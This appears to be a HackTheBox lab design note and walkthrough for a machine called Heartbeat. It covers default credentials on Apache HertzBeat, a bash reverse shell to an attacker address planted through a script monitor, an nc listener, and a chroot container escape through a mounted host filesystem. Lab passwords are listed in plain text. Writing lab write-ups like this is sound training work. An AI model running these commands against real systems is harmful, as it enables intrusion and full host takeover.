# Heartbeat

## Introduction

Heartbeat was created to showcase the security risks associated with trusted operator features in monitoring platforms and the dangers of running containerized services with excessive privileges. The machine highlights the critical importance of the principle of least privilege, both in application design and container deployment. Key skills demonstrated include API exploitation, custom YAML payload crafting, and Docker container breakout through filesystem mounts.

## Info for HTB

### Access

Passwords:

| User     | Password                            |
| -------- | ----------------------------------- |
| monitor  | StrongMonitorPass2024!              |
| operator | hertzbeat                           |
| root     | RootPassword2024!                   |

### Key Processes

- **Apache HertzBeat v1.8.0**: Java-based monitoring application running inside Docker container `hertzbeat`. Exposed on port 1157. Process runs as root inside the container. The application contains an intentional design feature allowing authenticated users to execute arbitrary commands via script-based monitoring templates.

- **MySQL 8.0**: Backend database for HertzBeat, running in container `hertzbeat-mysql` on port 3306 (internal Docker network only).

- **SSH**: Standard OpenSSH server on port 22 for remote access to the host system.

### Automation / Crons

- **Docker Container Persistence**: The `hertzbeat` and `hertzbeat-mysql` containers are configured with `restart: unless-stopped` in their Docker Compose configuration.
  - **What does it do?** Automatically restarts the vulnerable HertzBeat service if it crashes or after system reboot.
  - **Why?** Ensures the exploitation target is consistently available, simulating a production monitoring environment that requires high availability.
  - **How does it run?** Managed by Docker daemon's restart policy defined in `/opt/hertzbeat/docker-compose.yml`.

### Firewall Rules

- Port 22/tcp (SSH) - ALLOW
- Port 1157/tcp (HertzBeat) - ALLOW
- All other inbound traffic - DENY

### Docker

The machine uses two Docker containers orchestrated by Docker Compose:
- `hertzbeat`: The vulnerable application container running Apache HertzBeat 1.8.0
- `hertzbeat-mysql`: MySQL database container for application data persistence

The host's root filesystem is mounted inside the `hertzbeat` container at `/mnt/host` to simulate a configuration management or log aggregation scenario. This mount point serves as the container escape vector.

### Other

- Default credentials (`operator:hertzbeat`) are intentionally left enabled, reflecting common real-world misconfigurations.
- The `monitor` user exists on the host with SSH access, representing a system administrator account.
- The machine name is set to `heartbeat.htb` to align with the monitoring theme.

# Writeup

This comprehensive walkthrough demonstrates the complete exploitation chain for Heartbeat, from initial enumeration to root flag capture. Every command is provided for direct copy-paste execution, allowing readers to replicate the attack path precisely.

# Enumeration

Begin reconnaissance with a comprehensive port scan to identify all available services on the target.

```bash
nmap -p- --min-rate 10000 -oN nmap/all_ports.txt 10.10.11.x
```

From the scan, we identify open ports: 22 (SSH) and 1157 (HertzBeat web interface).

Next, perform a detailed service scan on the discovered ports.

```bash
nmap -p22,1157 -sV -sC -oN nmap/detailed_scan.txt 10.10.11.x
```

The detailed scan confirms SSH on port 22 and Apache HertzBeat on port 1157.

# Initial Access

Access the HertzBeat web interface at http://10.10.11.x:1157.

Log in using the default credentials: `operator:hertzbeat`.

Once logged in, navigate to the monitoring section.

# Exploitation

Create a new monitor to execute arbitrary commands. Select "Script" as the monitor type.

In the script field, enter a payload to establish a reverse shell. For example:

```bash
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
```

Replace `10.10.14.x` with your attacker's IP.

Save the monitor and trigger it to execute.

Set up a listener on your machine:

```bash
nc -lvnp 4444
```

You should receive a reverse shell as the root user inside the Docker container.

# Container Escape

Inside the container, check the mounted host filesystem:

```bash
ls /mnt/host
```

The host's root filesystem is mounted at `/mnt/host`. To escape, change root to the host:

```bash
chroot /mnt/host /bin/bash
```

Now you are on the host system as root.

# Privilege Escalation

On the host, read the user flag:

```bash
cat /home/monitor/user.txt
```

To get root, use the provided root password:

```bash
su root
```

Password: `RootPassword2024!`

Then, read the root flag:

```bash
cat /root/root.txt
```

# Conclusion

This machine demonstrates the risks of privileged containers and default credentials. Always follow least privilege principles.